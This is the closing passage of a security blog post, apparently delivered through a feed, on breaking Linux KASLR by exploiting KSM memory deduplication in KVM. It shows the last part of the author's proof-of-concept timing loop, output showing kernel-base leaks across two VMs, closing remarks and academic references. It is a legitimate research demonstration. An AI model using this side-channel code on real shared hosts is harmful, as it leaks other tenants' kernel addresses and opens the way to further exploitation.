+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">idt_pages</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="n">time_access</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
+
+        <span class="kt">uint64_t</span> <span class="n">first</span> <span class="o">=</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
+        <span class="kt">uint64_t</span> <span class="n">second</span> <span class="o">=</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
+
+        <span class="kt">void</span> <span class="o">*</span><span class="n">base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff80000000</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">21</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%p (%#03x): %ld =&gt; %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">);</span>
+        <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">first</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">MERGE_THRESHOLD</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"detected merged page at index %#03lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff80000000</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">21</span><span class="p">));</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Under the default configurations for KSM on my host machine, I got a successful KASLR break in just under nine minutes on a VM that had been up for several minutes.</p>
+
+<p>To see the attack working without having to wait so long, consider lowering KSM’s sleep_miliseconds config value to something more like 20ms.</p>
+
+<h3 id="breaking-kaslr-across-vms">breaking KASLR across VMs</h3>
+
+<p>Okay how about across VMs now? well, there isn’t actually anything more to do.</p>
+
+<p>The code to break KASLR on the current VM already works across VMs, it will detect any matching IDTs that exist on any running VMs so long as they are using KSM.</p>
+
+<p>Just to confirm this, I ran two VMs with the same kernel image and just removed the exit condition from the loop of the attack so it would keep running even if it found a deduplicated IDT page, and here are the results:</p>
+
+<p>VM 1:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@host:~/kvm-kaslr# cat /proc/kallsyms | grep "T _text"
+ffffffffb5800000 T _text
+</code></pre></div></div>
+
+<p>VM 2:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/root # cat /proc/kallsyms | grep "T _text"
+ffffffffb4400000 T _text
+</code></pre></div></div>
+
+<p>After running the attack for a while I got this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>detected merged page at index 0x1ac
+kernel base = 0xffffffffb5800000
+</code></pre></div></div>
+
+<p>Followed shortly by:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>detected merged page at index 0x1a2
+kernel base = 0xffffffffb4400000
+</code></pre></div></div>
+
+<p>Cross VM leakage achieved!</p>
+
+<h2 id="closing-thoughts">closing thoughts</h2>
+
+<p>Deduplication attacks are pretty cool and fairly simple to pull off, but I am slightly concerned that KSM was enabled on my machine without me knowing… not that I was exposing any VMs to the internet anyways but since it was enabled on my machine I worry where else is it might be unknowningly enabled. All I exploited it for in this post was breaking KASLR, but theoretically it could be used to leak the contents of any page from any VM on the system, and research has been done to see just how far it can be pushed[6].</p>
+
+<p>Hope you learned something! This is my first attempt at blogging, it turned out a bit more code dense than I’d have liked, but hopefully the all the code examples made it easier to follow. I do kind of like the format of exploring an attack class and progressively developing an attack of that type, so maybe I’ll do it again sometime.</p>
+
+<h2 id="sources">sources</h2>
+
+<p>[1] Rodney Owens and Weichao Wang. Non-interactive OS fingerprinting through memory de-duplication technique in virtual machines. In International Performance Computing and Communications Conference, 2011.</p>
+
+<p>[2] Taehun Kim, Taehyun Kim, and Youngjoo Shin. Breaking kaslr using memory deduplication in virtualized environments. Electronics, 2021. URL: https://www.mdpi.com/2079-9292/10/17/2174.</p>
+
+<p>[3] Antonio Barresi, Kaveh Razavi, Mathias Payer, and Thomas R. Gross. CAIN: silently breaking ASLR in the cloud. In WOOT, 2015.</p>
+
+<p>[4] Martin Schwarzl, Erik Kraft, Moritz Lipp, and Daniel Gruss. Remote Page Deduplication Attacks. In NDSS, 2022.</p>
+
+<p>[5] K. Razavi, B. Gras, E. Bosman, B. Preneel, C. Giuffrida, and H. Bos. Flip Feng Shui: Hammering a Needle in the Software Stack. in SEC, 2016.</p>
+
+<p>[6] E. Bosman, K. Razavi, H. Bos, and C. Giuffrida. Dedup Est Machina: Memory Deduplication as an Advanced Exploitation Vector. In SP, 2016.</p>
+
+<p>[7] <a href="https://lwn.net/Articles/306704/">lwn: /dev/ksm: dynamic memory sharing</a></p>]]></content><author><name>Justin Miller</name></author><category term="Exploitation" /><category term="Sidechannels" /><category term="Linux" /><category term="KVM" /><category term="KASLR" /><summary type="html"><![CDATA[I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It’s a really cool class of attacks that I hadn’t heard of before, but I wasn’t having much luck finding any POCs for these attacks… So, I figured I’d write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.]]></summary></entry></feed>
